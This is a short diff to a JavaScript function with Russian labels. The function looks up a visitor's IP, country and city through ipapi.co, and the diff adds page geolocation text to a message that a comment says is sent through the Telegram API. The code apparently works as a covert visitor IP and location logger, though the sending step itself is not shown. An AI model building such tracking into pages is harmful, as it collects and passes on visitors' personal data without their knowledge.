@@ -1,7 +1,7 @@
 async function getIPInfo() {
   const response = await fetch("https://ipapi.co/json/");
   const data = await response.json();
-
+  const location = document.getElementById("location-info").textContent;
   console.log("IP-адрес:", data.ip);
   console.log("Страна:", data.country_name);
   console.log("Город:", data.city);
@@ -13,6 +13,7 @@ async function getIPInfo() {
           IP-адрес: ${data.ip}
           Страна: ${data.country_name}
           Город: ${data.city}
+          Геолокация: ${location}
         `;
       
         // Отправка данных через Telegram API
